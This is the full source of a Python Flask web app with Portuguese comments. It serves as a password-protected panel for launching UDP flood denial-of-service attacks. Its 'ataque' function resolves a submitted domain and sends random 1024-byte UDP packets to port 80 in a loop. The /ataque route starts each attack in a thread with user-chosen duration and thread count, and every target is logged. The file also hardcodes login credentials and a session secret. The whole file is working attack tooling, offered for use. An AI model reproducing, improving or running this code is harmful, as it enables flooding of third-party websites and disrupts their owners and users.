from flask import Flask, render_template, request, redirect, url_for, session
import threading
import time
from datetime import datetime
import socket
import random
import re
import os

app = Flask(__name__)
app.secret_key = 'McFlySystem2025'

# Diretório de logs
if not os.path.exists('logs'):
    os.makedirs('logs')

# Login
USERNAME = 'mcflyoperador123'
PASSWORD = 'apenasumasenha12345'  # Pode trocar aqui se quiser

# Limite máximo de threads
MAX_THREADS = 500


# ==========================
# Limpa HTTPS da URL
# ==========================
def sanitize_url(url):
    url = re.sub(r'^https?://', '', url)
    url = url.strip().split('/')[0]
    return url


# ==========================
# Função de ataque
# ==========================
def ataque(url, tempo, threads):
    fim = time.time() + tempo
    target = sanitize_url(url)

    try:
        ip = socket.gethostbyname(target)
    except Exception as e:
        print(f"[ERRO] Domínio inválido: {target}")
        return

    bytes_data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while time.time() < fim:
        for _ in range(threads):
            try:
                sock.sendto(bytes_data, (ip, 80))
            except:
                pass
        time.sleep(0.5)

    gerar_log(target)


# ==========================
# Gera relatório
# ==========================
def gerar_log(url):
    agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    codigo = os.urandom(4).hex().upper()
    log = f"URL:{url} | DATA&HORA:{agora} | CÓDIGO:{codigo}\n"

    with open('logs/relatorio.txt', 'a') as f:
        f.write(log)


# ==========================
# Rotas principais
# ==========================
@app.route('/')
def home():
    if 'logged_in' in session:
        return render_template('index.html')
    else:
        return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if (request.form['username'] == USERNAME and
                request.form['password'] == PASSWORD):
            session['logged_in'] = True
            return redirect(url_for('home'))
        else:
            return render_template('login.html', erro='Credenciais incorretas')
    return render_template('login.html')


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


@app.route('/ataque', methods=['POST'])
def iniciar_ataque():
    if 'logged_in' in session:
        url = request.form['url']
        tempo = min(int(request.form['tempo']), 200)  # Limite máximo de tempo = 200 segundos
        threads = min(int(request.form['threads']), MAX_THREADS)  # Máximo de 500 threads

        thread = threading.Thread(target=ataque, args=(url, tempo, threads))
        thread.start()

        return f"Ataque iniciado em {url} por {tempo} segundos com {threads} threads."
    else:
        return redirect(url_for('login'))


@app.route('/logs')
def logs():
    if 'logged_in' in session:
        if os.path.exists('logs/relatorio.txt'):
            with open('logs/relatorio.txt', 'r') as file:
                conteudo = file.read()
        else:
            conteudo = "Nenhum log encontrado."
        return render_template('logs.html', logs=conteudo)
    else:
        return redirect(url_for('login'))


# ==========================
# Executar o app
# ==========================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
